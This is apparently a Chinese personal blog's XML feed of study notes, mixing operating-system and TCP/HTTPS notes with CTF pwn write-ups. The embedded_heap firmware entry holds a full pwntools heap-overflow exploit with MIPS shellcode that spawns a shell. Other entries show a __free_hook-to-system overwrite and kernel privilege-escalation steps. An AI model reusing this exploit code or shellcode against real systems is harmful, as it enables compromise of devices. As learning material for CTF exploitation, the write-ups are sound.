i in range(7):    	Add(0x20)    #raw_input()    Show()    #dbg()    #raw_input()    Edit_target('y','n',free_hook - 8)    Edit_target('y','n',free_hook + 8)    Edit_target('y','n',0)    Edit_target('y','n',0x605398)    Edit_target('y','n',0x6053A8)    dbg()    raw_input()    Show()    Edit_target('y','n',0x68732F6E69622F)  #/bin/sh    Edit_target('y','n',system)    Clear()    irt()总结1.unlink技巧:Prev_size为负数且chunk1-(-prev_size)=chunk2size-&gt;prev_use为0chunk2-&gt;size-&gt;prev_use=0chunk2-&gt;next_chunk-&gt;prev_inuse = chunk2-&gt;size2.通过修改__free_hook-8和_free_hook为system]]></content>
      <categories>
        
          <category> CTF/pwn </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[深入理解操作系统]]></title>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2020/09/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/</url>
      <content type="text"><![CDATA[深入理解操作系统（一）操作系统加载程序过程：      预处理阶段：预处理器根据cpp字符以字符#开头的命令匹配文件告诉寄存器,将文件内容插入到程序文本中,重新生成文件        编译阶段：编译器将hello.i翻译成hello.s,包含一个汇编程序    汇编阶段：将hello.s翻译成机器语言并打包成可重定位目标程序  链接阶段：hello程序调用了printf程序,printf函数存在一个printf.o的单独的预编译好了的目标文件中，而这个文件必须以某种形式合并到hello.o文件中,链接器就处理这种合并,就得到hello程序加载到内存中了解编译系统是如何工作的好处：  优化程序性能  理解链接时出现的错误  避免安全漏洞系统的硬件组成      总线    总线是贯穿整个系统的电子管道，用来传送定长的字节块，也就是字，字长是一个基本的系统参数，现在机器字长要么是32位，要么是64位        I/O设备    系统与外部世界的联系通道，每个设备通过一个控制器或适配器与IO总线相连，控制器是电路板上的芯片组，适配器是主板插槽上的一张卡        主存    临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。物理上，主存是一组动态随机存储器芯片组成的。逻辑上，存储器是一个线性的字节数组，每个字节都有唯一的地址        CPU  ​        中央处理器，是解释或执行在主存中指令的殷勤。处理器的核心是一个大小为一个字的存储设备，称为程序计数器。PC永远都指向主存中的某条机器指令。​        处理器从程序计数器指向的内存处读取指令，解释指令中的位，执行该指令指示的简单操作，更新PC，指向下一条指令。这些操作都围绕着主存、寄存器文件和算术/逻辑单元（ALU）进行，ALU计算新的数据和地址值。  加载：从主存复制一个字节或一个字到寄存器，以覆盖寄存器原来的内容。  存储：从寄存器复制一个字节或者一个字到主存的某个位置，以覆盖这个位置上原来的内容。  操作：把两个寄存器的内容复制到ALU，ALU对这两个字做算术运算，并存放到一个寄存器中，以覆盖该寄存器中原来的内容。  跳转：从指令本身中抽取一个字，并将这个字复制到程序计数器中，以覆盖PC中原来的值系统运行hello程序流程：从shell中输入“./hello” 输出Hello World流程一：I/O设备将用户输入的字符hello通过总线读入寄存器并送到内存中。流程二：当按下Enter键，处理器将hello程序和程序数据从磁盘读入到内存中，利用DMA技术可以不经过处理器流程三：CPU处理指令，当运行到printf后，指令将hello，world从主内复制到寄存器文件，并从寄存器文件复制到显示设备，最终显示屏幕中。进程进程是操作系统对一个正在运行的程序的一种抽象，在一个系统上可以同时运行多个进程，并发运行是指一个进程的指令和另一个进程的指令是交错执行的。通过处理器在进程间切换来实现的，这种切换称为上下文切换。存包的内容有PC和寄存器文件的当前值，以及是主存的内容。线程一个进程可以由多个线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。虚拟内存虚拟内存是抽象的概念，对所有进程来说看到内存都是一致的，称为虚拟地址空间。系统之间利用网络通信从系统上来看，网络可视为一个I/O设备，当系统从主存复制一串字节到网络适配器时，数据流经过网络到达另一台机器并发和并行并发：一个同时具有多个活动的系统并行指的是用并发来使一个系统运行得更快线程级并发使用线程可以能够让一个进程中执行多个控制流。超线程，有时称为同时多线程是一项允许一个cpu执行多个控制流的技术。它涉及CPU某些硬件有多个备份，比如程序计数器和寄存器文件，而其他的硬件部分只有一份。指令级并发在较低的抽象层次上，现代处理器可以同时执行多条指令的属性称为指令集执行。进程与线程的区别  进程是资源分配最小单位，线程是程序执行的最小单位；  进程有自己独立的地址空间，每启动一个进程，系统都会为其分配地址空间，建立数据表来维护代码段、堆栈段和数据段，线程没有独立的地址空间，它使用相同的地址空间共享数据；  CPU切换一个线程比切换进程花费小；  创建一个线程比进程开销小；  线程占用的资源要⽐进程少很多。  线程之间通信更方便，同一个进程下，线程共享全局变量，静态变量等数据，进程之间的通信需要以通信的方式（IPC）进行；（但多线程程序处理好同步与互斥是个难点）  多进程程序更安全，生命力更强，一个进程死掉不会对另一个进程造成影响（源于有独立的地址空间），多线程程序更不易维护，一个线程死掉，整个进程就死掉了（因为共享地址空间）；  进程对资源保护要求高，开销大，效率相对较低，线程资源保护要求不高，但开销小，效率高，可频繁切换；]]></content>
      <categories>
        
          <category> 操作系统 </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[学习TCP/IP、HTTP和HTTPS]]></title>
      <url>/%E5%8D%8F%E8%AE%AE/2020/09/15/%E5%9F%BA%E7%A1%80%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
      <content type="text"><![CDATA[TCP/IP工作流程：1.在源主机上，主机将应用层一串数据流传送给传输层2.传输层将数据进行分组，并加上TCP报头形成TCP段，传到网络层3.网络层在TCP段中附加源和目的的IP地址，生成一个IP数据包，并将IP数据包给链路层4.链路层在其MAC帧上的数据包上添加IP数据包，附加源和目的的MAC地址和帧头，并将根据目的MAC地址发往目标主机在目的主机上：1.链路层将MAC地址帧头去掉，并将IP数据包交给网络层2.网络层检查ip报头，如果报头的校验值和计算结果不一致，则丢弃该数据包；若校验结果和计算结果一致，则去掉ip报头，将TCP段传交给传输层3.传输层检查顺序号，判断是否为正确的TCP分组，然后检查报头数据。若正确，则向源主机发确认消息；若不正确或丢包，则向源主机要求重发消息。4.在目的主机，传输层去掉TCP报头，将排好顺序的分组组成应用数据流送给应用程序。这样目的主机接收到来自源主机的字节流，就像是直接接受到一样。1.建立协议（三次握手）（1）客户端发送一个带syn标志的TCP报文到服务器，seq=X（一般为1），标志为syn（2）服务器回应客户端，这个报文带ACK标志和SYN标志，seq=y，ack=x+1，SYN=1,ACK=1（3）客户端必须回应服务器一个ACK标志的报文 ACK=1进行三次握手的原因：1.确保对方主机是接受到TCP报文的，防止一些无用的连接增加服务器开销以及防止已失效的连接请求报文又突然传到服务端，产生错误。2.网络传输是有延迟的，建立三次握手可以避免因为主机突然中断而传送不了消息导致另一台主机认为连接一直是开启的，同时第三次握手可以保证对方主机发送过来的消息是可以接受到的。四次挥手：1.客户端想要释放连接，发送一段TCP报文，TCP报文FIN标志为1，seq的标志为u，客户端进入FIN-WAIT-1状态2.服务器端接收到从客户端发出的TCP报文后，确认客户端想要释放连接，随后服务端进入CLOSE-WAIT状态，随后发送一段TCP报文TCP报文的ACK标志为1，seq=v,ack=u+1客户端接收到TCP报文后，进入FIN-WAIT-2状态3.服务器端再次向客户端发出报文，报文的FIN标志位为1，Seq=U+1，ACK=W+1，服务器端进入LAST-ACK状态4.客户端接受到报文后，进入TIME-WAIT状态，并发送一段TCP报文，标志位为ACK，Seq=u+1,ack=W+1，随后进入等待2MSL状态，等待2MSL状态之后进入CLOSED状态MSL状态表示等待一段TCP报文存活周期，2MSL是即是服务器端发出为FIN报文和客户端发出的ACK确认报文所能保持有效的最大时长。为什么要等待2MSL：因为客户端要等待服务器进入CLOSED状态，由此正式确认关闭服务器到客户端的连接进入2MSL状态再次向客户端发送报文则客户端再次重发确认报文，并重置计时器等待2MSL。为什么要三次握手，而挥手要四次TCP建立连接时之所以只需要”三次握手”，是因为在第二次”握手”过程中，服务器端发送给客户端的TCP报文是以SYN与ACK作为标志位的。SYN是请求连接标志，表示服务器端同意建立连接；ACK是确认报文，表示告诉客户端，服务器端收到了它的请求报文。即SYN建立连接报文与ACK确认接收报文是在同一次”握手”当中传输的，所以”三次握手”不多也不少，正好让双方明确彼此信息互通。TCP释放连接时之所以需要“四次挥手”,是因为网络不可靠的，你无法确认与ACK确认接收报文和FIN释放连接报文对面是接收到的，所以需要四次挥手TCP保证可靠性主要依靠下面7种机制：1、检验和TCP检验和的计算与UDP一样，在计算时要加上12byte的伪首部，检验范围包括TCP首部及数据部分，但是UDP的检验和字段为可选的，而TCP中是必须有的。计算方法为：在发送方将整个报文段分为多个16位的段，然后将所有段进行反码相加，将结果存放在检验和字段中，接收方用相同的方法进行计算，如最终结果为检验字段所有位是全1则正确（UDP中为0是正确），否则存在错误。2、序列号TCP将每个字节的数据都进行了编号，这就是序列号。序列号的作用：a、保证可靠性（当接收到的数据总少了某个序号的数据时，能马上知道）b、保证数据的按序到达c、提高效率，可实现多次发送，一次确认d、去除重复数据数据传输过程中的确认应答处理、重发控制以及重复控制等功能都可以通过序列号来实现3、确认应答机制（ACK）TCP通过确认应答机制实现可靠的数据传输。在TCP的首部中有一个标志位——ACK，此标志位表示确认号是否有效。接收方对于按序到达的数据会进行确认，当标志位ACK=1时确认首部的确认字段有效。进行确认时，确认字段值表示这个值之前的数据都已经按序到达了。而发送方如果收到了已发送的数据的确认报文，则继续传输下一部分数据；而如果等待了一定时间还没有收到确认报文就会启动重传机制。正常情况下的应答机制：4、超时重传机制当报文发出后在一定的时间内未收到接收方的确认，发送方就会进行重传（通常是在发出报文段后设定一个闹钟，到点了还没有收到应答则进行重传），其基本过程如下：当接收方接收到重复的数据时就将其丢掉，重新发送ACK。而要识别出重复的数据，就要用到前面提到的序列号了，利用序列号很容易就可以做到去重的效果。重传时间的确定：报文段发出到收到应答中间有一个报文段的往返时间RTT，显然超时重传时间RTO会略大于这个RTT，TCP会根据网络情况动态的计算RTT，即RTO是不断变化的。在Linux中，超时以500ms为单位进行控制，每次判定超时重发的超时时间都是500ms的整数倍。其规律为：如果重发一次仍得不到应答，就等待2500ms后再进行重传，如果仍然得不到应答就等待4500ms后重传，依次类推，以指数形式递增，重传次数累计到一定次数后，TCP认为网络或对端主机出现异常，就会强行关闭连接5。流量控制接收端处理数据的速度是有限的，如果发送方发送数据的速度过快，导致接收端的缓冲区满，而发送方继续发送，就会造成丢包，继而引起丢包重传等一系列连锁反应。因此TCP支持根据接收端的处理能力，来决定发送端的发送速度，这个机制叫做流量控制。在TCP报文段首部中有一个16位窗口长度，当接收端接收到发送方的数据后，在应答报文ACK中就将自身缓冲区的剩余大小，放入16窗口大小中。这个大小随数据传输情况而变，窗口越大，网络吞吐量越高，而一旦接收方发现自身的缓冲区快满了，就将窗口设置为更小的值通知发送方。如果缓冲区满，就将窗口置为0，发送方收到后就不再发送数据，但是需要定期发送一个窗口探测数据段，使接收端把窗口大小告诉发送端。其过程如下：7、拥塞控制流量控制解决了 两台主机之间因传送速率而可能引起的丢包问题，在一方面保证了TCP数据传送的可靠性。然而如果网络非常拥堵，此时再发送数据就会加重网络负担，那么发送的数据段很可能超过了最大生存时间也没有到达接收方，就会产生丢包问题。为此TCP引入慢启动机制，先发出少量数据，就像探路一样，先摸清当前的网络拥堵状态后，再决定按照多大的速度传送数据。此处引入一个拥塞窗口：发送开始时定义拥塞窗口大小为1；每次收到一个ACK应答，拥塞窗口加1；而在每次发送数据时，发送窗口取拥塞窗口与接送段接收窗口最小者。慢启动：在启动初期以指数增长方式增长；设置一个慢启动的阈值，当以指数增长达到阈值时就停止指数增长，按照线性增长方式增加；线性增长达到网络拥塞时立即“乘法减小”，拥塞窗口置回1，进行新一轮的“慢启动”，同时新一轮的阈值变为原来的一半。“慢启动”机制可用图表示：TCP和UDP的区别TCP：HTTP、DNS、FTPUDP：SNMP、TFTPHTTP和HTTPS的区别HTTP的特点：  http协议支持客户端/服务端模式，也是一种请求/响应模式的协议  简单快速：客户向服务器请求服务时，只需传送请求方法和路径。  灵活：http允许传输任意类型的数据对象。传输的类型由Content-type标记  无连接：处理完请求后就断开连接，cookie和session是为了弥补这种缺点  无状态：无状态是指协议对于事务处理没有记忆，后续处理需要前面的消息，则必须重传HTTPS的特点：SSL使用了安全套接字层，SSL协议位于TCP/IP协议与各种应用层协议之间，为数据通讯提供安全支持传输数据流程：1.客户端向服务端请求https连接2.服务返回证书（包含公钥）给客户端3.客户端开始协商SSL连接的安全等级4.客户端根据双方同意的安全等级，建立会话密钥，然后利用网站的公钥将会话加密，传送给网站5 服务器利用自己的私钥解密出会话密钥6 服务器利用会话密钥加密与客户端之间的通信]]></content>
      <categories>
        
          <category> 协议 </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[固件安全-embedd_heap]]></title>
      <url>/%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/2020/09/15/%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8-embedded_heap/</url>
      <content type="text"><![CDATA[固件安全前言本篇是我学习固件安全的技术笔记，包括我遇到的问题，以及解决的方式工具常用工具:1.qemu2.IDA3.Ghidra如何用qemu-system-mips 启动embedd_heap1.传文件到qemu宿主机 ifconfig tap0 10.0.0.1 qemu要ifconfig eth0 ip 10.0.0.2宿主机用python -m SimpleHttpserver 8080 启动一个简单的http服务qemu用wget IP：8080/*.tar.gz 获取文件，80%要压缩文件2.解压到qemu中，然后将elf文件目录下的lib扔到/lib,然后chmod 777 /lib/*然后启动./embedd_heap就可以了搭建MIPS环境https://blog.csdn.net/u012763794/article/details/82750102https://e3pem.github.io/2019/08/23/mips-pwn/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.堆溢出-embedd_heap逻辑分析main函数：1.update：更新堆的size,填充内容2.view: 查看堆的内容3.pwn:continuous delete two heap  并且update heap Update:通过update我们可以看到，我们可以填入size，并且输入跟size大小相同的内容，同时这里有个堆溢出的漏洞，因为我们输入完size之后，该heap并没有重新calloc相同size的大小，主要我们分配的size比之前的大，那我们就可以进行堆溢出view：就是输出heap对应size的内容del：free heap，同时将heap所对应的指针置0，也就是说没有UAF漏洞利用思路固件一般使用ulibc,可认为是旧版的glibc在旧版的glibc中malloc_state数据结构struct malloc_state {  /* The maximum chunk size to be eligible for fastbin */  size_t  max_fast;   /* low 2 bits used as flags */  /* Fastbins */  mfastbinptr      fastbins[NFASTBINS];  /* Base of the topmost chunk -- not otherwise kept in a bin */  mchunkptr        top;  /* The remainder from the most recent split of a small request */  mchunkptr        last_remainder;  /* Normal bins packed as described above */  mchunkptr        bins[NBINS * 2];  /* Bitmap of bins. Trailing zero map handles cases of largest binned size */  unsigned int     binmap[BINMAPSIZE+1];  /* Tunable parameters */  unsigned long     trim_threshold;  size_t  top_pad;  size_t  mmap_threshold;  /* Memory map support */  int              n_mmaps;  int              n_mmaps_max;  int              max_n_mmaps;  /* Cache malloc_getpagesize */  unsigned int     pagesize;  /* Track properties of MORECORE */  unsigned int     morecore_properties;  /* Statistics */  size_t  mmapped_mem;  size_t  sbrked_mem;  size_t  max_sbrked_mem;  size_t  max_mmapped_mem;  size_t  max_total_mem;};在新版glibc中max_fast改为了全局变量所以可以使用house_of_prime的方式#define fastbin_index(sz)        ((((unsigned int)(sz)) &gt;&gt; 3) - 2)将max_fast修改为一个堆地址,8»3-2 = -1即可，这样max_fast变为一个非常大的值，我们可以继续利用上面这段代码将某个变量改为堆地址。由于在mips中不支持nx这种方式，所以可直接指定将_dl_run_fini_array的函数指向我们的堆地址然后执行exit的时候执行里面的代码的时候会调用_dl_run_fini_array的函数，这样就可以执行我们的shellcode了# 在qemu-system-mode下可以查看堆地址EXPfrom pwn import *p = remote('192.168.122.12',"9999")context.log_level = 'debug'context.arch = "mips"context.endian = 'big'chunks_size = []def get_chunk_size():    for i in range(3):        p.recvuntil("Chunk["+str(i)+"]:")        size = int(p.recvuntil("bytes",drop=True))        #log.success("chunk_size:"+chunk_size)        #size = int(chunk_size) &amp; 0xff0        #log.success("chunk_size:"+str(hex(size)))        if size%4==0:            if size%8==0:                    size = size+4            else:                    pass        else:            size = size+4-size%4            if size%8==0:                    size = size+4        if size &lt;= 8:                size = 12        chunks_size.append(size)        log.success("chunk_size:"+str(hex(size)))def choice(idx):    p.sendlineafter("Command",str(idx))def update(idx,size,content):    choice(1)    print str(size)    p.sendlineafter("Index",str(idx))    p.sendlineafter("Size",str(size))    p.sendafter("Content",content)def view():    choice(2)def pwn_over(idx1,idx2,idx3,size,content):    choice(3)    p.sendlineafter("Index",str(idx1))    p.sendlineafter("Index",str(idx2))    p.sendlineafter("Index",str(idx3))    raw_input()    p.sendlineafter("Size",str(size))    p.sendafter("Content",content)get_chunk_size()payload1 = 'a'*chunks_size[0]+p32(0x9) update(0,len(payload1),payload1) #heap_over_sizepayload2 = 'b'*chunks_size[2]+p32(0x305d9) #raw_input()update(2,len(payload2),payload2)buf =  ""buf += "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27"buf += "\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4"buf += "\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f"buf += "\xab\x01\x01\x01\x0c\x2f\x62\x69\x6e\x2f\x73\x68\x00"payload3 = 'a'*(chunks_size[2]-4)+buf #prev_size + sizepwn_over(1,3,2,len(payload3),payload3)p.interactive()遇到的问题  开启gdbserver卡在监听端口换到3.2.0+-vmlinux就可以了      用socat兼调试gdbserver    ./socat tcp-l:9999,fork exec:./embedded_heap &amp; (sh run.sh &amp;)  参考https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/]]></content>
      <categories>
        
          <category> 固件安全 </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[操作系统内存管理模型]]></title>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2020/09/15/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9E%8B/</url>
      <content type="text"><![CDATA[一、内存管理方案1、分区：固定分区、可变分区固定分区—&gt;内存分为若干分区，每个分区大小可不同但固定不变，而且只能装载一个进程，容易产生内部碎片可变分区—&gt;根据进程需要分割内存并分配，剩余部分成为新的空闲区，容易产生外部碎片【只有外部碎片才可以碎片整理】碎片问题：碎片：很小的，不易利用的空闲区，导致内存利用率下降解决方案：紧缩技术（memory compaction）在内存移动程序，将所有小的空闲区合并为较大的空闲区又称：压缩技术、紧致技术、搬家技术紧缩时要考虑的问题：系统开销，移动时机2、页式存储管理方案用户进程地址空间被划分为大小相等的部分，称为页（page）或页面，从0开始编号内存分配规则以页为单位，按进程需要的页数分配，逻辑上相邻的页，物理上不一定相邻页式存储存在的问题：会造成最后一页的部分空间浪费，即产生内碎片3、段式存储管理方案与页式存储相似，只不过内存的划分是不等长的，用空闲区表和已分配表管理内存分配4、伙伴系统 BUDDY SYSTEM一种经典的内存分配方案，主要思想：将内存按2的幂进行划分，组成若干空闲块链表；查找该链表找到能满足进程需求的最佳匹配块，Linux底层内存管理采用，一种特殊的分离适配算法5、虚拟内存 + 交换分区地址转换的过称为，逻辑地址先拿到段号，去段表查到段号所对应的页表起始地址，再通过页号查页表所在的页，然后把页内地址加到页的起始地址上得到真实的物理地址虚拟内存： 虚拟内存技术虚拟地址空间 ：是一块数据区域，虚假的内存地址空间虚拟地址： 虚拟地址是虚拟地址空间上的一个值逻辑地址：指由程序产生的段内偏移地址。逻辑地址与虚拟地址二者之间没有明确的界限。线性地址：指虚拟地址到物理地址变换的中间层，是处理器可寻址的内存空间（称为线性地址空间）中的地址。程序代码会产生逻辑地址，或者说段中的偏移地址，加上相应段基址就成了一个线性地址。如果启用了分页机制，那么线性地址可以再经过变换产生物理地址。若是没有采用分页机制，那么线性地址就是物理地址。虚拟地址：是由程序产生的由段选择符和段内偏移地址组成的地址。这2部分组成的地址并不能直接访问物理内存，而是要通过分段地址的变化处理后才会对应到相应的物理内存地址。物理地址：指内存中物理单元的集合，他是地址转换的最终地址，进程在运行时执行指令和访问数据最后都要通过物理地址来存取主存。逻辑（虚拟）地址经过分段（查询段表）转化为线性地址。线性地址经过分页（查询页表）转为物理地址。二、页面置换算法地址映射过程中，若在页面中发现所要访问的页面不在内存中，则产生缺页中断。当发生缺页中断时，如果操作系统内存中没有空闲页面，则操作系统必须在内存选择一个页面将其移出内存，以便为即将调入的页面让出空间。而用来选择淘汰哪一页的规则叫做页面置换算法。1．最佳置换算法（OPT）（理想置换算法）：从主存中移出永远不再需要的页面；如无这样的页面存在，则选择最长时间不需要访问的页面。于所选择的被淘汰页面将是以后永不使用的，或者是在最长时间内不再被访问的页面，这样可以保证获得最低的缺页率。2．先进先出置换算法（FIFO）：如果一个数据最先进入缓存中，则应该最早淘汰掉。也就是说，当缓存满的时候，应当把最先进入缓存的数据给淘汰掉。实现：利用一个双向链表保存数据，当来了新的数据之后便添加到链表末尾，如果Cache存满数据，则把链表头部数据删除，然后把新的数据添加到链表末尾。在访问数据的时候，如果在Cache中存在该数据的话，则返回对应的value值；否则返回-1。如果想提高访问效率，可以利用hashmap来保存每个key在链表中对应的位置。只有FIFO算法可能出现Belady 异常：产生当所分配的物理块数增大而页故障数不减反增的异常现象3、最近最久未使用（LRU）算法：如果一个数据在最近一段时间没有被访问到，那么在将来它被访问的可能性也很小。也就是说，当限定的空间已存满数据时，应当把最久没有被访问到的数据淘汰。实现：（1）用一个数组来存储数据，给每一个数据项标记一个访问时间戳，每次插入新数据项的时候，先把数组中存在的数据项的时间戳自增，并将新数据项的时间戳置为0并插入到数组中。每次访问数组中的数据项的时候，将被访问的数据项的时间戳置为0。当数组空间已满时，将时间戳最大的数据项淘汰。思路简单，但是需要不停地维护数据项的访问时间戳，另外，在插入数据、删除数据以及访问数据时，时间复杂度都是O(n)。（2）利用链表和hashmap。当需要插入新的数据项的时候，如果新数据项在链表中存在（一般称为命中），则把该节点移到链表头部；如果不存在，则新建一个节点，放到链表头部。若缓存满了，则把链表最后一个节点删除即可。在访问数据的时候，如果数据项在链表中存在，则把该节点移到链表头部，否则返回-1。这样一来在链表尾部的节点就是最近最久未访问的数据项。4、LFU – 最近最少使用基于“如果一个数据在最近一段时间内使用次数很少，那么在将来一段时间内被使用的可能性也很小”的思路。LFU是基于访问次数的。实现：为了能够淘汰最少使用的数据，LFU算法最简单的一种设计思路就是利用一个数组存储数据项，用hashmap存储每个数据项在数组中对应的位置，然后为每个数据项设计一个访问频次，当数据项被命中时，访问频次自增，在淘汰的时候淘汰访问频次最少的数据。这样一来的话，在插入数据和访问数据的时候都能达到O(1)的时间复杂度，在淘汰数据的时候，通过选择算法得到应该淘汰的数据项在数组中的索引，并将该索引位置的内容替换为新来的数据内容即可，这样的话，淘汰数据的操作时间复杂度为O(n)。LRU/LFU区别：LRU考察的是多久未访问，时间越短越值得留在内存，LFU是访问次数/频度，次数越多越好。 5、第二次机会页面置换算法对先进先出进行修改，检查最老页面的R(访问位)位。如果R位是0那么这个页面没有被使用，可以被置换，如果是1，则将R位清0，并把该页面放到链表的尾端，修改他的装入时间。这个方法虽然可以避免常用页面被换出，但需要经常在链表中移动页面，降低了效率。当需要从内存中换出某个页面时，它是否只能是缺页进程本身的页面（局部置换）？这个要换出的页面是否可以属于另外一个进程（全局置换）？一些页面置换算法既适用于局部置换算法，又适用于全局置换算法。例如，FIFO能够将所有内存中最老的页面置换掉（全局算法），也能将当前进程的页面中最老的替换掉（局部算法）。 相似地，LRU或是一些类似算法能够将所有内存中最近最少访问的页框替换掉（全局算法），或是将当前进程中最近最少使用的页框替换掉（局部算法）。在某些情况下，选择局部策略还是全局策略是与页面置换算法无关的。对于其他的页面置换算法，只有采用局部策略才有意义。特别是工作集和WSClock算法是针对某些特定进程的而且必须应用在这些进程的上下文中。实际上没有针对整个机器的工作集，并且试图使用所有工作集的并集作为机器的工作集可能会丢失一些局部特性，这样算法就不能得到好的性能。三、进程调度算法1、先来先服务(FCFS)调度算法FCFS调度算法是一种最简单的调度算法，该调度算法既可以用于作业调度也可以用于进程调度。在作业调度中，算法每次从后备作业队列中选择最先进入该队列的一个或几个作业，将它们调入内存，分配必要的资源，创建进程并放入就绪队列。FCFS调度算法的特点是算法简单，但效率低；对长作业比较有利，但对短作业不利（相对SJF和高响应比）；有利于CPU繁忙型作业，而不利于I/O繁忙型作业。2、短作业优先(SJF)调度算法短作业（进程）优先调度算法是指对短作业（进程）优先调度的算法。短作业优先(SJF)调度算法是从后备队列中选择一个或若干个估计运行时间最短的作业，将它们调入内存运行。而短进程优先(SPF)调度算法，则是从就绪队列中选择一个估计运行时间最短的进程，将处理机分配给它，使之立即执行，直到完成或发生某事件而阻塞时，才释放处理机。JF调度算法也存在不容忽视的缺点：1&gt;.该算法对长作业不利，由表2-3和表2-4可知，SJF调度算法中长作业的周转时间会增加。更严重的是，如果有一长作业进入系统的后备队列，由于调度程序总是优先调度那些 (即使是后进来的）短作业，将导致长作业长期不被调度（“饥饿”现象，注意区分“死锁”。后者是系统环形等待，前者是调度策略问题）。2&gt;.该算法完全未考虑作业的紧迫程度，因而不能保证紧迫性作业会被及时处理。3&gt;.由于作业的长短只是根据用户所提供的估计执行时间而定的，而用户又可能会有意或无意地缩短其作业的估计运行时间，致使该算法不一定能真正做到短作业优先调度。注意，SJF调度算法的平均等待时间、平均周转时间最少。3、优先级调度算法优先级调度算法又称优先权调度算法，该算法既可以用于作业调度，也可以用于进程调度，该算法中的优先级用于描述作业运行的紧迫程度。在作业调度中，优先级调度算法每次从后备作业队列中选择优先级最髙的一个或几个作业，将它们调入内存，分配必要的资源，创建进程并放入就绪队列。在进程调度中，优先级调度算法每次从就绪队列中选择优先级最高的进程，将处理机分配给它，使之投入运行。4、高响应比优先调度算法高响应比优先调度算法主要用于作业调度，该算法是对FCFS调度算法和SJF调度算法的一种综合平衡，同时考虑每个作业的等待时间和估计的运行时间。在每次进行作业调度时，先计算后备作业队列中每个作业的响应比，从中选出响应比最高的作业投入运行。5、时间片轮转调度算法时间片轮转调度算法主要适用于分时系统。在这种算法中，系统将所有就绪进程按到达时间的先后次序排成一个队列，进程调度程序总是选择就绪队列中第一个进程执行，即先来先服务的原则，但仅能运行一个时间片，如100ms。在使用完一个时间片后，即使进程并未完成其运行，它也必须释放出（被剥夺）处理机给下一个就绪的进程，而被剥夺的进程返回到就绪队列的末尾重新排队，等候再次运行。在时间片轮转调度算法中，时间片的大小对系统性能的影响很大。如果时间片足够大，以至于所有进程都能在一个时间片内执行完毕，则时间片轮转调度算法就退化为先来先服务调度算法。如果时间片很小，那么处理机将在进程间过于频繁切换，使处理机的开销增大，而真正用于运行用户进程的时间将减少。因此时间片的大小应选择适当。时间片的长短通常由以下因素确定：系统的响应时间、就绪队列中的进程数目和系统的处理能力。6、多级反馈队列调度算法该算法将系统中的进程就绪队列从一个拆分为若干个，将不同类型或性质的进程固定分配在不同的就绪队列，不同的就绪队列采用不同的调度算法，一个就绪队列中的进程可以设置不同的优先级，不同的就绪队列本身也可以设置不同的优先级。设置多个就绪队列。在系统中设置多个就绪队列，并为每个队列赋予不同的优先级。队列的优先级逐个降低，在优先级愈高的队列中，其时间片就愈小。每个队列都采用FCFS算法。按队列优先级调度。]]></content>
      <categories>
        
          <category> 操作系统 </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Linux  Kernel  Pwn  栈溢出]]></title>
      <url>/linux-kernel-pwn/2020/09/15/Linux-Kernel-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      <content type="text"><![CDATA[0x01 背景栈溢出是最基本的一个漏洞，学习 pwn 从栈溢出开始学习是比较简单的入门方式。之前也研究过 linux 内核，但因为种种原因不得不放弃。现在跟着安卓版主学习了几天linux内核漏洞，收获了不少知识，开始自己梳理和分享自己的笔记，特此感谢版主老师的教导0x02 内核基本知识Canary: 是防止栈溢出的保护，一般在 ebp-0x8 的位置，学习 linux pwn 的基本知识，不细讲KASLR：地址随机化，类似 ASLRSMAP：内核保护机制，内核态不可使用用户态的数据SMEP：内核保护机制，内核态不可执行用户的代码commit_creds(prepare_kernel_cred(0)) :获得 root权限功能函数file_opertion : Linux使用file_operations结构访问驱动程序的函数,这个结构的每一个成员的名字都对应着一个调用ioctl系统调用来控制设备获取基址vmlinux_base: 内核加载基址,有了这个可以绕过 kaslr 实现内核的其他函数  获取方式:head /proc/kallsyms 1,startup对应的地址就是基址core_base:驱动加载基地址  查看基地址方式cat /proc/modulescat /proc/devicescat /proc/kallsymslsmoddmesg0x03 分析代码题目:2018 强网杯CTF pwncore保护机制从checksec我们可以知道开启canary和nx enable 在start.sh可以看到内核没有开启smep和smap，但开启kaslr程序逻辑ioctl首先是ioctl,通过ioctl可以实现core_read和修改off和core_core_func三个功能，我们可以控制ioctl的三个参数，就是arg1(a1),arg2,arg3 core_read通过ioctl我们可以知道core_read的两个参数对应着arg3和arg2,这里有个泄漏栈地址的漏洞copy_to_user,该函数功能是从v6+off开始的位置读取64个字符到arg3中，通过这个函数可以将栈上v6+off到v6+off+0x64的栈空间传递到我们的buff,即可泄漏canary和vmlinux_base以及core_base,方便我们构造ROP chain。core _writecore_write函数这里copy_from_user可以让我们写name,限制字符数是0x800copy_copy_func这里注意到qmemcpy,v2是rbp-50h的地方，可是name是我们控制的变量，并且可以写0x800个字符，那么我们可以这里进行栈溢出劫持控制流如何编写EXP编写EXP的时候我们需要注意，进入内核时需要保存当前进程的环境,同时在  init_module 里面有个core_proc = proc_create(“core”, 438LL, 0LL, 